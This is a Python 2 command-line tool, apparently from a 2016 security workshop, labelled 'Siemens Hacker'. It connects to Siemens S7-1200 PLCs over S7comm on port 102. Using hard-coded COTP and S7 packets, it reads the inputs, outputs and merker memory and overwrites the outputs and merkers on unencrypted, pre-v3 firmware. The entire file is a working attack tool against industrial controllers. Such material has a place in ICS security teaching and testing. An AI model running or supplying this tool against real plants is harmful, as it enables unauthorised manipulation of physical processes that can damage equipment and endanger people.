#! /data/data/com.termux/files/usr/bin/python2
'''
	Copyright 2015 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.

        ###### ------------------------------------------------------- ######
        ###### --------------------- 2016-04-10 ---------------------- ######
        File name S7-1200-Workshop.py
        written by tijl[dot]deneut[at]howest[dot]be
        This script works on both Linux and Windows
        
        Designed to be used as an inline script for manipulating
          in- and outputs and merkers.
          Only tested on S7-1200 series, before firmware v3 (no encryption)
'''

import os, sys, argparse, re, socket, binascii
from fungsi import warna

##### Global vars
sIP = sOutputs = sMerkers = ''
iPort = 102
bRead = False
iBUFFER = 4096

##### Functions
def showBanner():
    print """
[*****************************************************************************]
                   This script works on both Linux and Windows

                            --- Siemens Hacker ---
                 This script reads in- and outputs and merkers
                      AND writes outputs and merkers.
            (For now only S7-1200 with Basic Firmware <= 3 is tested)
                            

______________________/-> Created By Tijl Deneut(c) <-\_______________________
[*****************************************************************************]
    """

def finish(sMessage=''):
    print(str(sMessage))
    sys.exit()

def parseArgs():
    global sIP, iPort, sOutputs, sMerkers, iMerkerOffset, bRead
    def isIpv4(ip):
        match = re.match("^(\d{0,3})\.(\d{0,3})\.(\d{0,3})\.(\d{0,3})$", ip)
        if not match: return False
        quad = []
        for number in match.groups(): quad.append(int(number))
        if quad[0] < 1: return False
        for number in quad:
            if number > 255 or number < 0: return False
        return True
    
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', metavar='ip:<port>', help="Target IP to use (e.g. 192.168.1.50 or 10.0.0.10:102)", required=True)
    parser.add_argument('-p', metavar='port', help="Target Port to use (default 102)", type=int, default=102)
    parser.add_argument('-r', help="Read values", action='store_true')
    parser.add_argument('-o', metavar='outputs', help="Set Outputs (e.g. 00000000)")
    parser.add_argument('-m', metavar='merkers,<offset>', help="Set Merkers with offset (e.g. 10101010,3 to set merkers 3.0 through 3.7)")
    args = parser.parse_args()
    sIP = args.t.split(':')[0]
    if not isIpv4(sIP): finish(warna.merah + '[x] ' + warna.tutup + 'Error: Wrong IP, please go read RFC 791 and then use a legitimate IPv4 address.')
    iPort = args.p
    if len(args.t.split(':')) > 1: iPort = args.t.split(':')[1]
    try: iPort = int(iPort)
    except: finish(warna.merah + '[x] ' + warna.tutup + 'Error: Port not recognized '+str(iPort)+')')
    if args.o: sOutputs = re.sub(r'[^01]+','',args.o)
    if args.m:
        sMerkers = re.sub(r'[^01]+','',args.m.split(',')[0])
        iMerkerOffset = 0
        if len(args.m.split(',')) > 1: iMerkerOffset = args.m.split(',')[1]
        try: iMerkerOffset = int(iMerkerOffset)
        except:finish(warna.merah + '[x] ' + warna.tutup + 'Error: Merker offset is not a decimal (' + iMerkerOffset + ')')
    if args.r:
        bRead = True
        sOutputs = sMerkers = ''
    if not sOutputs and not sMerkers: bRead = True

def sendAndRecv(sock, strdata, sendOnly = False):
    global iBUFFER
    data = binascii.unhexlify(strdata.replace(' ','')) ## Convert to real HEX (\x00\x00 ...)
    sock.send(data)
    if sendOnly: return
    ret = sock.recv(iBUFFER)
    return ret

def setupConnection(sIP, iPort):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            sock.settimeout(1)
            sock.connect((sIP, iPort))
            break

        except socket.error as e:
            print warna.merah + "\n[x] " + warna.tutup + "An error occured :" ,e
            sys.exit()

    ## Always start with a COTP CR (Connection Request), we need a CS (Connection Success) back
    cotpsync = binascii.hexlify(sendAndRecv(sock, '03000016' + '11e00000000100c0010ac1020100c2020101'))
    if not cotpsync[10:12] == 'd0': finish(warna.merah + '[x] ' + warna.tutup + 'COTP Sync failed, PLC not reachable?')
    ## First 4 bytes are TPKT (last byte==datalength), next 3 bytes are COTP, last 18 bytes are S7Comm Setup Communication
    s7comsetup = binascii.hexlify(sendAndRecv(sock, '03000019' + '02f080' + '32010000722f00080000f0000001000101e0'))
    if not s7comsetup[18:20] == '00': finish(warna.merah + '[x] ' + warna.tutup + 'Some error occured with S7Comm setup, full data: ' + s7comsetup)
    return sock

def printData(sWhat, s7Response): ## Expects 4 byte hex data (e.g. 00000000)
    if not s7Response[18:20] == '00': finish(warna.merah + '[x] ' + warna.tutup + 'Some error occured with S7Comm Setup, full response: ' + str(s7Response) + '\n')
    s7Data = s7Response[14:]
    datalength = int(s7Data[16:20], 16) ## Normally 5 bytes for a byte, 6 if we request word, 8 if we request real
    s7Items = s7Data[28:28 + datalength*2]
    if not s7Items[:2] == 'ff': finish(warna.merah + '[x] ' + warna.tutup + 'Some error occured with S7Comm Data Read, full S7Comm data: ' + str(s7Data) + '\nFirmware not supported?\n')
    
    print('       ###--- ' + sWhat + ' ---###')
    sToShow = [''] * 8
    for i in range(0,4):
        iOffset1 = (4 - i) * -2
        iOffset2 = iOffset1 + 2
        if iOffset2 == 0: iOffset2 = None
        iData = int(s7Items[iOffset1:iOffset2], 16) ## Now we have e.g. 02, which is 00000010

        for j in range(0,8):
            ## Performing binary and of the inputs AND 2^1 to get value of last bit
            bVal = iData & int(2**j)
            if not bVal == 0: bVal = 1
            sToShow[j] = sToShow[j] +  str(i) + '.' + str(j) + ': ' + str(bVal) + ' | ' 
    for i in range(0,8): print(sToShow[i][:-2])
    print('')

def getAllData(sIP, iPort):
    ## Setup the connection
    sock = setupConnection(sIP, iPort)
    
    ## First 4 bytes are TPKT (last byte==datalength), next 3 bytes are COTP, last 24 bytes are S7Comm Read Var.
    ##   Request Byte (02) or Word (04) or Dword (06)
    ##   '81' means read inputs (I)
    ##   '000000' means starting at Address 0 (I think)
    
    ## Get Inputs in Dword (so 32 inputs) starting from Address 0
    s7Response = binascii.hexlify(sendAndRecv(sock, '0300001f' + '02f080' + '32010000732f000e00000401120a10 06 00010000 81 000000'.replace(' ','')))
    printData('Inputs',s7Response)

    ## Outputs (82)
    s7Response = binascii.hexlify(sendAndRecv(sock, '0300001f' + '02f080' + '32010000732f000e00000401120a10 06 00010000 82 000000'.replace(' ','')))
    printData('Outputs',s7Response)

    ## Merkers (83)
    s7Response = binascii.hexlify(sendAndRecv(sock, '0300001f' + '02f080' + '32010000732f000e00000401120a10 06 00010000 83 000000'.replace(' ','')))
    printData('Merkers',s7Response)
    sock.close()

def setOutputs(sIP, iPort, sOutputs):
    ## Outputs need to be reversed before sending: ('11001000' must become '00010011')
    sOutputs = sOutputs[::-1]
    ## Converted to hexstring ('00010011' becomes '13')
    hexstring = hex(int(sOutputs, 2))[2:]
    if len(hexstring) == 1: hexstring = '0' + hexstring # Add leading zero
    
    ## Setup the connection
    sock = setupConnection(sIP, iPort)

    ## Set Outputs
    ## First 4 bytes are TPKT (last byte==datalength), next 3 bytes are COTP, last 24 bytes are S7Comm Set Var, last byte contains data to send!
    s7Response = binascii.hexlify(sendAndRecv(sock, '03000024' + '02f080' + '32010000732f000e00050501120a1002000100008200000000040008' + hexstring))
    if s7Response[-2:] == 'ff': print(warna.hijau + '[*] ' + warna.tutup + 'Writing Outputs successful')
    else: print(warna.merah + '[x] ' + warna.tutup + 'Error writing outputs.')
    sock.close()

def setMerkers(sIP, iPort, sMerkers, iMerkerOffset=0):
    ## Outputs need to be reversed before sending: ('11001000' must become '00010011')
    sMerkers = sMerkers[::-1]
    ## Converted to hexstring ('00010011' becomes '13')
    hexstring = hex(int(sMerkers, 2))[2:]
    if len(hexstring) == 1: hexstring = '0' + hexstring # Add leading zero
    
    ## Setup the connection
    sock = setupConnection(sIP, iPort)

    ## Set Merkers
    ## First 4 bytes are TPKT (last byte==datalength), next 3 bytes are COTP, last bytes are S7Comm Write Var, '83' is Merker, last bytes contain data to send!
    # '320100000800000e00080501120a1006000100008300000000040020 00070000'
    ## '83' is merkers
    ## '000000' is address (address 9 = 000048 => '1001' + '000' = 0100 1000 = 0x48)
    ## 04 is WORD (so 2 bytes in the end)
    
    ## Convert iMerkerOffset to BIN, add '000' and convert back to HEX
    sMerkerOffset = bin(iMerkerOffset)
    sMerkerOffset = sMerkerOffset + '000'
    hMerkerOffset = str(hex(int(sMerkerOffset[2:],2)))[2:]
    hMerkerOffset = hMerkerOffset.zfill(6) ## Add leading zero's up to 6
    #print('Sending '+hexstring+' using offset '+hMerkerOffset)

    s7Response = binascii.hexlify(sendAndRecv(sock, '03000025' + '02f080' + '320100001500000e00060501120a100400010000 83 ' + hMerkerOffset + '00 04 0010' + hexstring + '00'))
    if s7Response[-2:] == 'ff': print(warna.hijau + '[*] ' + warna.tutup + 'Writing Merkers successful')
    else: print(warna.merah + '[x] ' + warna.tutup + 'Error writing merkers.')
    sock.close()

##### The Actual Program
## The Banner
showBanner()
parseArgs()
if bRead:
    print(warna.kuning + '[!] ' + warna.tutup + 'Will perform a single read of the outputs, inputs and the (first 32) merkers')
if sOutputs:
    print(warna.kuning + '[!] ' + warna.tutup + 'Will write this data to the outputs: ' + sOutputs)
    setOutputs(sIP, iPort, sOutputs)
if sMerkers:
    print(warna.kuning + '[!] ' + warna.tutup + 'Will write this data to the merkers: ' + sMerkers + ' using offset ' + str(iMerkerOffset))
    setMerkers(sIP, iPort, sMerkers, iMerkerOffset)
print(warna.hijau + '[*] ' + warna.tutup + 'using '+sIP + ':' + str(iPort) + '\n')
getAllData(sIP, iPort)
